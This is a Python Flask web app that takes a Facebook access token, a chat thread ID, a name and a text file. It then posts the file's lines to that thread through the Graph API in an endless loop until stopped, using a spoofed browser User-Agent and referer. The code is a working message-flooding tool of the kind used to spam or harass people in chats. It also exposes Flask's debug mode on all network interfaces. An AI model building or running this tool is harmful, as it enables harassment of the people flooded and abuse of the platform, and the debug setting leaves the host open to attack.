from flask import Flask, request
import requests
import os
import threading
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

# Global control variable
stop_flag = False

def send_messages(access_token, thread_id, mn, time_interval, messages):
    global stop_flag
    stop_flag = False
    while not stop_flag:
        try:
            for message1 in messages:
                if stop_flag:   # agar stop dabaya ho to loop tod do
                    break
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"✅ Message sent: {message}")
                else:
                    print(f"❌ Failed: {message}")
                time.sleep(time_interval)
        except Exception as e:
            print("⚠️ Error:", e)
            time.sleep(10)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Run in background thread
        thread = threading.Thread(target=send_messages, args=(access_token, thread_id, mn, time_interval, messages))
        thread.start()

        return "<h3>🚀 Messages started sending in background. <a href='/stop'>Stop Here</a></h3>"

    return '''
    <form method="post" enctype="multipart/form-data">
        Token: <input type="text" name="accessToken"><br>
        Thread ID: <input type="text" name="threadId"><br>
        Name: <input type="text" name="kidx"><br>
        File: <input type="file" name="txtFile"><br>
        Interval(sec): <input type="number" name="time"><br>
        <button type="submit">Start</button>
    </form>
    '''


@app.route('/stop')
def stop():
    global stop_flag
    stop_flag = True
    return "<h3>🛑 Messages stopped successfully.</h3>"


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)